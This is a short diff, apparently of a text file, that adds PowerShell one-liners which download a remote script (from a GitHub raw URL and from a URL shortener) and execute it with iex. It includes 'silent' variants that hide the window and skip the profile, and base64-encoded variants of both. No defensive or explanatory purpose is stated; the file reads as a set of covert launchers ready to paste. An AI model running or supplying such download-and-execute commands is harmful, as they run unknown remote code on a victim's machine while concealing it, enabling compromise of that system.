@@ -1,1 +1,10 @@
 powershell -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ogyeet10/installer9000/main/conf.ps1')"
+
+Silent Version
+powershell -WindowStyle Hidden -NoProfile -Command "iex((New-Object System.Net.WebClient).DownloadString('https://t.ly/TBedb'))" 
+
+Base64 versions (DO NOT USE THIS ONE, WONT WORK IN RUN)
+powershell -encodedCommand aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAE8AZwB5AGUAZQB0ADEAMAAvAGkAbgBzAHQAYQBsAGwAZQByADkAMAAwADAALwBtAGEAaQBuAC8AYwBvAG4AZgAuAHAAcwAxACcAKQA=
+
+Silent Version
+powershell -WindowStyle Hidden -NoProfile -encodedCommand aQBlAHgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHQALgBsAHkALwBUAEIAZQBkAGIAJwApACkA
